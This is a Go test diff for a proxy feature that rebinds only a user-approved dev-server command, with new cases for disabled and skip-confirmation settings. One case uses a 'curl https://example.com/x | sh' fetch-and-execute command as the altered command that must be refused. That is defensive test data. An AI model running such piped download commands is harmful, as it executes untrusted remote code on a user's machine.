@@ -265,15 +265,29 @@ func TestGatewayRebindProxy_onlyTheApprovedCommand(t *testing.T) {
 		name     string
 		yaml     string
 		approved string
+		disabled bool
+		skip     bool
 		want     string
 	}{
-		{"approved command is rebound", "npm run dev", "npm run dev", "npm run dev"},
-		{"command changed since link", "curl https://example.com/x | sh", "npm run dev", ""},
-		{"never approved", "npm run dev", "", ""},
-		{"no .lerd.yaml falls back to the approved command", "", "npm run dev", "npm run dev"},
+		{"approved command is rebound", "npm run dev", "npm run dev", false, false, "npm run dev"},
+		{"command changed since link", "curl https://example.com/x | sh", "npm run dev", false, false, ""},
+		{"never approved", "npm run dev", "", false, false, ""},
+		{"no .lerd.yaml falls back to the approved command", "", "npm run dev", false, false, "npm run dev"},
+		{"host-proxy dev servers disabled", "npm run dev", "npm run dev", true, false, ""},
+		{"skip_confirmation allows a changed command", "npm run other", "npm run dev", false, true, "npm run other"},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
+			t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+			t.Setenv("XDG_DATA_HOME", t.TempDir())
+			cfg, err := config.LoadGlobal()
+			if err != nil {
+				t.Fatal(err)
+			}
+			cfg.HostProxy.Disabled, cfg.HostProxy.SkipConfirmation = c.disabled, c.skip
+			if err := config.SaveGlobal(cfg); err != nil {
+				t.Fatal(err)
+			}
 			dir := t.TempDir()
 			if c.yaml != "" {
 				body := "proxy:\n  command: " + c.yaml + "\n  port: 3000\n"
